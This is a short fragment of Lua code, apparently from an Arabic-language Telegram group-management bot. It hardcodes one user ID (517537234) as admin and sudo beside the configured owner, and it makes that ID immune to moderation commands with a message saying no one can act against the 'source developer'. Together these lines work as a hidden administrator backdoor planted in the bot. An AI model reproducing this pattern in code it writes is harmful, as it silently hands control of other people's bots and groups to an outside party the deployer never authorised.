...
local Adminn = false
if msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 517537234 or msg.sender_user_id_ == 517537234 then 
Adminn = true
...
result = false
if msg.sender_user_id_ == 517537234 or msg.sender_user_id_ == 517537234 then 
SudoBase = true
...
if UserID == 517537234 or UserID == 517537234 then return sendMsg(ChatID,MsgID,"- لا يمكنك تنفيذ الامر ضد مطور السورس ❕") end
